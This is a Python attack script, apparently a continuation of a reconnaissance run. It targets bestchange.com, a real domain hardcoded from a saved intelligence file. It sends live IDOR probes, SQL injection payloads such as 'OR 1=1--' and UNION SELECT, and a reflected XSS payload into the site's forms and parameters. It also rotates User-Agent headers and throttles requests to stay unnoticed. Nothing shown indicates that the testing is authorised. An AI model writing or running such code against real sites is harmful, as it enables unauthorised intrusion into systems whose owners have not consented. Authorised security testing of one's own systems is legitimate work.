#!/usr/bin/env python3
"""
Continue Deep Penetration Testing using saved intelligence
Focuses on analyzing discovered endpoints and forms without re-fetching
"""

import sys
import os
import site
import json
import time
import random
import re
from urllib.parse import urlparse, urljoin, parse_qs
from datetime import datetime

# Add user site-packages to path
user_site = site.getusersitepackages()
if user_site and os.path.exists(user_site):
    sys.path.insert(0, user_site)

import requests
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


class DeepPenTest:
    """Deep penetration testing using saved intelligence."""
    
    def __init__(self, intelligence_file):
        with open(intelligence_file, 'r') as f:
            self.intel = json.load(f)
        
        self.target_url = self.intel['target']
        self.domain = self.intel['domain']
        self.base_url = f"https://{self.domain}"
        
        # Setup session with rotation
        self.session = requests.Session()
        retry_strategy = Retry(total=1, backoff_factor=2)
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        ]
        
        self.findings = []
        self.request_delay = 3.0  # More conservative
        self.last_request = 0
    
    def log(self, msg, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        colors = {
            "INFO": Colors.OKCYAN, "SUCCESS": Colors.OKGREEN,
            "WARNING": Colors.WARNING, "ERROR": Colors.FAIL,
            "HEADER": Colors.HEADER, "BOLD": Colors.BOLD
        }
        color = colors.get(level, Colors.ENDC)
        print(f"{color}[{timestamp}] {msg}{Colors.ENDC}")
    
    def safe_request(self, url, method='GET', **kwargs):
        """Make request with rate limiting and rotation."""
        current = time.time()
        elapsed = current - self.last_request
        if elapsed < self.request_delay:
            time.sleep(self.request_delay - elapsed)
        
        # Rotate User-Agent
        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': self.base_url,
        })
        
        self.last_request = time.time()
        
        try:
            if method == 'GET':
                return self.session.get(url, timeout=20, **kwargs)
            elif method == 'POST':
                return self.session.post(url, timeout=20, **kwargs)
            else:
                return self.session.request(method, url, timeout=20, **kwargs)
        except Exception as e:
            return None
    
    def test_click_endpoints_idor(self):
        """Test click.php endpoints for IDOR vulnerabilities."""
        self.log("\n[IDOR TESTING] Testing click.php endpoints", "BOLD")
        
        click_endpoints = [e for e in self.intel['endpoints'] if 'click.php' in e]
        
        if not click_endpoints:
            self.log("  No click.php endpoints found", "INFO")
            return
        
        # Test first 5 endpoints
        for endpoint in click_endpoints[:5]:
            parsed = urlparse(endpoint)
            if not parsed.query:
                continue
            
            params = parse_qs(parsed.query)
            
            # Get original ID
            if 'id' in params:
                original_id = params['id'][0]
                
                # Test with modified IDs
                test_ids = [
                    str(int(original_id) + 100) if original_id.isdigit() else '999',
                    '0',
                    '-1',
                    '1',
                ]
                
                for test_id in test_ids:
                    test_params = params.copy()
                    test_params['id'] = [test_id]
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    
                    self.log(f"  Testing: {test_url}?id={test_id}", "INFO")
                    response = self.safe_request(test_url, params=test_params)
                    
                    if response and response.status_code == 200:
                        # Check if response is different (potential IDOR)
                        if len(response.text) > 100:
                            finding = {
                                'type': 'IDOR (Potential)',
                                'severity': 'Medium',
                                'url': endpoint,
                                'parameter': 'id',
                                'test_value': test_id,
                                'evidence': f'Different response for ID {test_id}',
                                'confidence': 50
                            }
                            self.findings.append(finding)
                            self.log(f"    ⚠ Potential IDOR with id={test_id}", "WARNING")
                            break
    
    def test_index_php_params(self):
        """Test index.php parameters for injection."""
        self.log("\n[PARAMETER TESTING] Testing index.php parameters", "BOLD")
        
        index_endpoints = [e for e in self.intel['endpoints'] if 'index.php' in e and '?' in e]
        
        for endpoint in index_endpoints[:3]:
            parsed = urlparse(endpoint)
            if not parsed.query:
                continue
            
            params = parse_qs(parsed.query)
            
            # Test SQLi on 'mt' parameter
            if 'mt' in params:
                sqli_payloads = ["' OR '1'='1", "1' UNION SELECT NULL--", "' OR 1=1--"]
                
                for payload in sqli_payloads:
                    test_params = params.copy()
                    test_params['mt'] = [payload]
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    
                    self.log(f"  Testing SQLi: {test_url}?mt={payload[:20]}...", "INFO")
                    response = self.safe_request(test_url, params=test_params)
                    
                    if response and response.status_code == 200:
                        # Check for SQL errors
                        sql_errors = ['sql syntax', 'mysql', 'database error', 'query failed']
                        response_lower = response.text.lower()
                        
                        for error in sql_errors:
                            if error in response_lower:
                                finding = {
                                    'type': 'SQL Injection',
                                    'severity': 'High',
                                    'url': endpoint,
                                    'parameter': 'mt',
                                    'payload': payload,
                                    'evidence': f"SQL error: {error}",
                                    'confidence': 75
                                }
                                self.findings.append(finding)
                                self.log(f"    ⚠ SQL Injection detected!", "WARNING")
                                break
    
    def analyze_js_files_deep(self):
        """Deep analysis of JavaScript files for vulnerabilities."""
        self.log("\n[JS DEEP ANALYSIS] Analyzing JavaScript files", "BOLD")
        
        js_files = self.intel.get('js_files', [])
        if not js_files:
            # Try to discover JS files from endpoints
            js_endpoints = [e for e in self.intel['endpoints'] if '.js' in e]
            js_files = js_endpoints[:5]
        
        for js_url in js_files:
            self.log(f"  Analyzing: {js_url[:70]}...", "INFO")
            
            response = self.safe_request(js_url)
            if not response or response.status_code != 200:
                continue
            
            js_content = response.text
            
            # Look for API endpoints
            api_patterns = [
                r'["\'](https?://[^"\']+/api/[^"\']+)["\']',
                r'["\'](/api/[^"\']+)["\']',
                r'fetch\(["\']([^"\']+)["\']',
                r'\.ajax\([^,]+["\']([^"\']+)["\']',
            ]
            
            for pattern in api_patterns:
                matches = re.finditer(pattern, js_content, re.IGNORECASE)
                for match in matches:
                    endpoint = match.group(1) if match.lastindex else match.group(0)
                    if endpoint.startswith('http'):
                        api_url = endpoint
                    else:
                        api_url = urljoin(self.base_url, endpoint)
                    
                    self.log(f"    → API Endpoint found: {endpoint[:60]}", "SUCCESS")
                    
                    # Test the API endpoint
                    time.sleep(2)
                    api_response = self.safe_request(api_url)
                    if api_response and api_response.status_code == 200:
                        finding = {
                            'type': 'API Endpoint Discovered',
                            'severity': 'Info',
                            'url': api_url,
                            'source': js_url,
                            'evidence': 'API endpoint found in JavaScript and accessible',
                            'confidence': 100
                        }
                        self.findings.append(finding)
    
    def test_forms_detailed(self):
        """Detailed testing of discovered forms."""
        self.log("\n[FORM TESTING] Detailed form analysis", "BOLD")
        
        forms = self.intel.get('forms', [])
        
        for form in forms[:3]:
            form_url = urljoin(self.base_url, form.get('action', '/'))
            method = form.get('method', 'GET').upper()
            
            self.log(f"  Testing form: {method} {form_url[:60]}...", "INFO")
            
            # Build parameters
            params = {}
            for inp in form.get('inputs', [])[:2]:
                name = inp.get('name') or inp.get('id', '')
                if name:
                    params[name] = 'test'
            
            if not params:
                continue
            
            # Test XSS
            xss_payload = "<img src=x onerror=alert('XSS')>"
            test_params = {k: xss_payload for k in params.keys()}
            
            response = self.safe_request(
                form_url,
                method=method,
                params=test_params if method == 'GET' else None,
                data=test_params if method == 'POST' else None
            )
            
            if response and response.status_code == 200:
                if xss_payload in response.text:
                    finding = {
                        'type': 'XSS (Reflected)',
                        'severity': 'Medium',
                        'url': form_url,
                        'parameter': list(params.keys())[0],
                        'payload': xss_payload,
                        'evidence': 'XSS payload reflected in response',
                        'confidence': 60
                    }
                    self.findings.append(finding)
                    self.log(f"    ⚠ XSS payload reflected!", "WARNING")
    
    def run(self):
        """Execute deep penetration test."""
        self.log("=" * 80, "HEADER")
        self.log("DEEP PENETRATION TEST - CONTINUED", "HEADER")
        self.log("=" * 80, "HEADER")
        
        self.test_click_endpoints_idor()
        self.test_index_php_params()
        self.analyze_js_files_deep()
        self.test_forms_detailed()
        
        # Save findings
        report = {
            'target': self.target_url,
            'test_date': datetime.now().isoformat(),
            'findings': self.findings,
            'summary': {
                'total': len(self.findings),
                'critical': len([f for f in self.findings if f.get('severity') == 'Critical']),
                'high': len([f for f in self.findings if f.get('severity') == 'High']),
                'medium': len([f for f in self.findings if f.get('severity') == 'Medium']),
            }
        }
        
        filename = f"deep_findings_{self.domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2, default=str)
        
        self.log(f"\n[SUMMARY]", "BOLD")
        self.log(f"  Total Findings: {len(self.findings)}", "INFO")
        self.log(f"  Report saved: {filename}", "SUCCESS")
        
        return report


if __name__ == "__main__":
    # Use the most recent intelligence file
    intel_file = "intelligence_bestchange.com_20251207_131721.json"
    
    if not os.path.exists(intel_file):
        print(f"Intelligence file not found: {intel_file}")
        sys.exit(1)
    
    tester = DeepPenTest(intel_file)
    tester.run()
